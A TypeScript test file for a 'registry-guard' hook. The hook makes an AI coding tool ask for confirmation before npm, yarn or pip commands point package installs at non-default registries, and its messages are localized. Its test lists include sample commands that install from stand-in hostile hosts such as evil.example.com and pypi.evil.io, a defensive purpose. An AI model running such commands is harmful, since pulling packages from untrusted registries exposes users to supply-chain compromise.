import { expect, test } from 'claude-code/testing'

const ASKED = [
  'npm config set registry https://registry.example.com/',
  'pnpm config set registry http://localhost:4873',
  'yarn config set registry https://npm.pkg.github.com',
  'npm install left-pad --registry=https://evil.example.com',
  'npm i left-pad --registry https://evil.example.com',
  'pip install requests --index-url https://pypi.evil.io/simple',
  'pip install -r requirements.txt --extra-index-url http://10.0.0.5/simple',
  'pip install -i https://mirror.example.com/simple requests',
  'pip config set global.index-url https://mirror.example.com/simple',
  'PIP_INDEX_URL=https://x.example.com/simple pip install y',
]

const PASSED = [
  'npm config set registry https://registry.npmjs.org/',
  'npm install left-pad --registry=https://registry.npmjs.org',
  'pip install requests',
  'pip install -r requirements.txt',
  'pip install --index-url https://pypi.org/simple requests',
  'npm config get registry',
  'npm install',
  'git status',
]

test('asks before a command points packages at another source, in English by default', async ($, on) => {
  on('tool.check', () => ({ decision: 'allow' }))

  for (const command of ASKED) {
    const verdict = await $.tool.check({ tool: 'Bash', input: { command } })
    expect(verdict.decision, command).toBe('ask')
    expect(verdict.reason, command).toContain('registry-guard: points packages at')
  }
})

test('lets default registries and everyday installs through', async ($, on) => {
  on('tool.check', () => ({ decision: 'allow' }))

  for (const command of PASSED) {
    const verdict = await $.tool.check({ tool: 'Bash', input: { command } })
    expect(verdict.decision, command).toBe('allow')
  }
})

test('asks in PowerShell too and keeps a verdict that is already a denial', async ($, on) => {
  on('tool.check', ($, e) => ({ decision: e.tool === 'PowerShell' ? 'allow' : 'deny', reason: 'beneath' }))

  const asked = await $.tool.check({
    tool: 'PowerShell',
    input: { command: 'npm config set registry https://registry.example.com/' },
  })
  expect(asked.decision).toBe('ask')

  const denied = await $.tool.check({
    tool: 'Bash',
    input: { command: 'npm config set registry https://registry.example.com/' },
  })
  expect(denied.decision).toBe('deny')
})

test('speaks the language set in the hub', async ($, on) => {
  on('tool.check', () => ({ decision: 'allow' }))
  // Stands in for the hub: answers the language it would hold.
  on('state.get', { plugin: 'cockpit', key: 'lang' }, () => ({ value: { value: 'pt', version: 1 } }))

  const verdict = await $.tool.check({
    tool: 'Bash',
    input: { command: 'npm config set registry https://registry.example.com/' },
  })
  expect(verdict.reason).toContain('registry-guard: aponta os pacotes para registry.example.com. Confirme.')
})

test('speaks Spanish when the hub is set to es', async ($, on) => {
  on('tool.check', () => ({ decision: 'allow' }))
  on('state.get', { plugin: 'cockpit', key: 'lang' }, () => ({ value: { value: 'es', version: 1 } }))

  const verdict = await $.tool.check({ tool: 'Bash', input: { command: 'pip install -i https://mirror.example.com/simple x' } })
  expect(verdict.reason).toBe('registry-guard: apunta los paquetes a mirror.example.com. Confirma.')
})

test('names the host without credentials, port or path', async ($, on) => {
  on('tool.check', () => ({ decision: 'allow' }))

  for (const [command, host] of [
    ['npm i x --registry=https://user:pass@npm.corp.local:8443/repo/', 'npm.corp.local'],
    ['NPM_CONFIG_REGISTRY=http://LOCALHOST:4873 npm i', 'localhost'],
    ['npm config set @acme:registry https://npm.acme.dev', 'npm.acme.dev'],
    ['yarn config set npmRegistryServer "https://yarn.acme.dev"', 'yarn.acme.dev'],
  ] as const) {
    const verdict = await $.tool.check({ tool: 'Bash', input: { command } })
    expect(verdict.reason, command).toBe(`registry-guard: points packages at ${host}. Confirm.`)
  }
})

test('leaves other tools and a verdict that already asks alone', async ($, on) => {
  on('tool.check', ($, e) => (e.tool === 'Write' ? { decision: 'allow' } : { decision: 'ask', reason: 'beneath' }))

  const write = await $.tool.check({ tool: 'Write', input: { file_path: '/a', content: '--registry=https://evil.example.com' } })
  expect(write.decision).toBe('allow')

  const asked = await $.tool.check({ tool: 'Bash', input: { command: 'npm i --registry=https://evil.example.com' } })
  expect(asked.reason).toBe('beneath')
})

test('passes an input without a command', async ($, on) => {
  on('tool.check', () => ({ decision: 'allow' }))

  const verdict = await $.tool.check({ tool: 'Bash', input: {} })
  expect(verdict.decision).toBe('allow')
})

test('asks for the first foreign host even when a default one comes first', async ($, on) => {
  on('tool.check', () => ({ decision: 'allow' }))

  const verdict = await $.tool.check({
    tool: 'Bash',
    input: { command: 'pip install --index-url https://pypi.org/simple --extra-index-url https://pkgs.evil.io/simple x' },
  })
  expect(verdict.reason).toContain('pkgs.evil.io')
})
